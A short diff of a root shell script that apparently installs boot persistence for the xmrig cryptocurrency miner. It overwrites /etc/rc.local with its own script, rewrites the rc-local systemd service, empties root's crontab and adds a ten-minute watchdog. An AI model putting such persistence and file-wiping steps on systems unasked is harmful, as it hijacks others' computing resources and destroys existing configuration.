@@ -32,6 +32,28 @@ chmod +x /root/danielchau.sh
 
 #sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof xmrig) > /dev/null 2>&1 &" danielchau.sh
 
+cat /dev/null > /etc/rc.local
+cp /root/danielchau.sh /etc/rc.local
+chmod +x /etc/rc.local
+
+cat /dev/null > /etc/systemd/system/rc-local.service
+
+cat >>/etc/systemd/system/rc-local.service <<EOF
+[Unit]
+Description=/etc/rc.local Support
+ConditionPathExists=/etc/rc.local
+
+[Service]
+ExecStart=/etc/rc.local start
+TimeoutSec=0
+StandardOutput=tty
+RemainAfterExit=yes
+SysVStartPriority=99
+
+[Install]
+WantedBy=multi-user.target 
+EOF
+
 cat /dev/null > /root/checkXMRIG.sh
 cat >>/root/checkXMRIG.sh <<EOF
 #!/bin/bash
@@ -48,7 +70,6 @@ chmod +x /root/checkXMRIG.sh
 
 cat /dev/null > /var/spool/cron/crontabs/root
 cat >>/var/spool/cron/crontabs/root<<EOF
-@reboot /root/danielchau.sh
 */10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
 EOF
 
